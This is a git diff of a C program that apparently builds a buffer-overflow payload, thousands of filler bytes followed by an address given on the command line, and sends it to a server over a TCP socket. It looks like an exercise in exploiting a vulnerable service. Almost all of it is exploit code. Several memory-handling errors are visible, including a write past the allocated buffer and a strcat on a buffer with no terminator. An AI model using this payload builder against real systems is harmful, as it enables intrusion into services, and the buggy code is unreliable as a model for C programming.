@@ -8,10 +8,11 @@
 #include <time.h>
 #include <unistd.h>
 #include <stdint.h>
-#define LETHAL_SIZE 8192
-#define NONLETHAL_SIZE 4000
+#define LETHAL_SIZE 8160// 18
+//#define NONLETHAL_SIZE 4000
 
 void delay(int sec);
+void my_reverse(char *s);
 
 int main(int argc, char **argv){
 	if(argc != 3){
@@ -19,42 +20,50 @@ int main(int argc, char **argv){
 		exit(0);
 	}
 	//int64_t addr = atoi(argv[2]);
-	char * addr = argv[2];
+	char *addr = (char *)malloc(16);
+	//my_reverse(addr);
+	//char * addr = argv[2];
+	strcpy(addr,argv[2]);
+	addr = addr + 2;
 	int port = atoi(argv[1]);
 	int socket_id;
 	struct sockaddr_in server;
 	ssize_t payload_id;
 	//char payload[SIZE];
-	int ch = 65;
-	int count = 315;
+	int ch = 90;
+	//int count = 315;
 	char *lethal =  (char *) malloc(LETHAL_SIZE*sizeof(char));
-	int there = 0;
-	for(int i = 0; i<LETHAL_SIZE; i++){ //every 315 switch A= 65
-		if(count-- > 0 && !there){
-			char character = (char)ch;
-			lethal[i] = character;
-		}else if(!there){
-			count = 315;
-			ch++;
-			char character = (char)ch;
-			lethal[i] = character;
-		}
-		if(i == 8151){
-			break;
-			there = 1;
-		}
+	//int there = 0;
+	int i;
+	for(i = 0; i<LETHAL_SIZE; i++){ //every 315 switch A= 65
+		char character = (char)ch;
+		lethal[i] = character;
+		// 	lethal[i] = character;
+		// if(count-- > 0 && !there){
+		// 	char character = (char)ch;
+		// 	lethal[i] = character;
+		// }else if(!there){
+		// 	count = 315;
+		// 	ch--;
+		// 	char character = (char)ch;
+		// 	lethal[i] = character;
+		// }
+		// if(i == 8148){//8153
+		// 	break;
+		// 	there = 1;
+		// }
 		// if(there){
 		// 	ch = 90;
 		// 	char character = (char)ch;
 		// 	lethal[i] = character;
 		// }
 	}
+	lethal[i+1] = *"Z";
 	strcat(lethal, addr);
-	// char *nonlethal = (char *) malloc(NONLETHAL_SIZE*sizeof(char));
-	// for(int i = 0; i<NONLETHAL_SIZE; i++){
-	// 	nonlethal[i] = *"0";
-	// }
-	//printf("sizeof lethal: %ld\n", sizeof(lethal));
+	strcat(lethal, "\0");
+	//strcat(addr,lethal);
+
+
 	socket_id = socket(AF_INET, SOCK_STREAM, 0);
 	if(socket_id == -1){
 		perror("Socket failed\n");
@@ -139,11 +148,34 @@ int main(int argc, char **argv){
 	// 		exit(0);
 	// 	}
 	// }
-	free(lethal);
+	//free(lethal);
 }
 
 void delay(int sec){
 	int mil = 1000000*sec;
 	clock_t start = clock();
 	while(clock()<start+mil);
+}
+
+void my_reverse(char *s)
+{
+   int length, c;
+   char *begin, *end, temp;
+ 
+   length = strlen(s);
+   begin  = s;
+   end    = s;
+ 
+   for (c = 0; c < length - 1; c++)
+      end++;
+ 
+   for (c = 0; c < length/2; c++)
+   {        
+      temp   = *end;
+      *end   = *begin;
+      *begin = temp;
+ 
+      begin++;
+      end--;
+   }
 }
